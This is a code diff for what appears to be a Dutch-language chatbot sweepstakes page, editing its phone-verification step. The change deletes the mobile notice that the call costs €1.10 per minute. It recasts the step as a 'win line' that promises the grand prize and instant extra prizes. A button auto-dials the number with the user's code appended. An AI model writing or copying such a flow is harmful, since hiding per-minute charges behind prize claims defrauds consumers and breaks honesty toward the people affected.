@@ -208,7 +208,10 @@ input[type="text"], input[type="tel"], input[type="email"], select {
     },
     {
       id: "ivr", condition: () => isLive, 
-      botTexts: ["Bedankt! Bevestig je deelname 🛡️", isMobile ? "Klik op de knop hieronder om direct te bellen." : "Bel het onderstaande nummer en toets de code in om te bevestigen."],
+      botTexts: [
+        "Je maakt nu officieel kans op de hoofdprijs! 🏆", 
+        "Wil je niet wachten? Bel ons speciale winlijn-nummer en hoor direct of je vandaag een van onze extra prijzen wint! ⚡"
+      ],
       inputType: "ivr_verify"
     }
   ];
@@ -335,17 +338,23 @@ input[type="text"], input[type="tel"], input[type="email"], select {
        for(let char of pinStr) {
            digitsHtml += `<div class="digit" style="display:inline-block; width:44px; height:56px; overflow:hidden; background:#f0f9f4; border:1px solid #c8e6c9; margin:0 4px; border-radius:8px; box-shadow:inset 0 2px 4px rgba(0,0,0,0.05);"><div class="digit-inner" style="display:flex; flex-direction:column; text-align:center; font-size:28px; font-weight:800; color:#14B670; line-height:56px; transition: transform 1.2s cubic-bezier(0.2, 0.8, 0.2, 1);"></div></div>`;
        }
+       
        if (isMobile) {
-           html = `<div id="ivr-mobile" style="text-align:center; width:100%;"><div style="font-size:16px; font-weight:700; color:#003C43; margin-bottom:12px;">Jouw verificatiecode:</div><div id="pin-code-spinner-mobile" class="pin-spinner" style="display:flex; justify-content:center; margin-bottom:16px;">${digitsHtml}</div><a href="tel:${IVR_NUMBER_DIAL},${pinStr}#" class="cta-primary ivr-call-btn" onclick="window.handleIVRCall()" style="display:flex; align-items:center; justify-content:center; text-decoration:none; margin-bottom:8px; font-size:18px;">📞 Bel Nu</a><div style="font-size:12px; color:#777; margin-top:8px;">(De code wordt automatisch ingetoetst, kosten zijn €1,10 per minuut. Volg de instructies op de lijn.)</div></div>`;
+           html = `<div id="ivr-mobile" style="text-align:center; width:100%;">
+                    <div style="font-size:16px; font-weight:700; color:#003C43; margin-bottom:12px;">Jouw exclusieve toegangscode:</div>
+                    <div id="pin-code-spinner-mobile" class="pin-spinner" style="display:flex; justify-content:center; margin-bottom:16px;">${digitsHtml}</div>
+                    <a href="tel:${IVR_NUMBER_DIAL},${pinStr}#" class="cta-primary ivr-call-btn" onclick="window.handleIVRCall()" style="display:flex; align-items:center; justify-content:center; text-decoration:none; margin-bottom:8px; font-size:18px;">📞 Speel direct mee</a>
+                    <div style="font-size:12px; color:#777; margin-top:8px;">(Je code wordt automatisch ingevoerd)</div>
+                   </div>`;
            setTimeout(() => animatePinRevealSpinner(pinStr, "pin-code-spinner-mobile"), 100);
        } else {
            html = `<div id="ivr-desktop" style="text-align:center; width:100%; background:#fcfdfd; padding:24px 20px; border-radius:12px; border:1px solid #e5e9ec; box-shadow:0 4px 15px rgba(0,0,0,0.03);">
-                <div style="font-size:14px; color:#555; text-transform:uppercase; letter-spacing:1px; font-weight:600; margin-bottom:6px;">Bel naar:</div>
-                <div style="font-size:32px; font-weight:900; color:#14B670; margin-bottom:24px; text-shadow:0 1px 2px rgba(20,182,112,0.15);">${IVR_NUMBER_DISPLAY}</div>
-                <div style="font-size:16px; font-weight:700; color:#003C43; margin-bottom:14px;">En toets deze code in:</div>
-                <div id="pin-container-desktop" style="margin-bottom:28px;"><div id="pin-code-spinner-desktop" class="pin-spinner" style="display:flex; justify-content:center;">${digitsHtml}</div></div>
-                <button type="button" class="cta-primary" onclick="window.handleIVRCall()" style="font-size:16px; width:100%; padding:14px 0;">Ik heb gebeld & bevestigd</button>
-             </div>`;
+                    <div style="font-size:14px; color:#555; text-transform:uppercase; letter-spacing:1px; font-weight:600; margin-bottom:6px;">Bel de winlijn:</div>
+                    <div style="font-size:32px; font-weight:900; color:#14B670; margin-bottom:24px; text-shadow:0 1px 2px rgba(20,182,112,0.15);">${IVR_NUMBER_DISPLAY}</div>
+                    <div style="font-size:16px; font-weight:700; color:#003C43; margin-bottom:14px;">En toets deze code in:</div>
+                    <div id="pin-container-desktop" style="margin-bottom:28px;"><div id="pin-code-spinner-desktop" class="pin-spinner" style="display:flex; justify-content:center;">${digitsHtml}</div></div>
+                    <button type="button" class="cta-primary" onclick="window.handleIVRCall()" style="font-size:16px; width:100%; padding:14px 0;">Ik heb gebeld & meegespeeld</button>
+                 </div>`;
            setTimeout(() => animatePinRevealSpinner(pinStr, "pin-code-spinner-desktop"), 100);
        }
     }
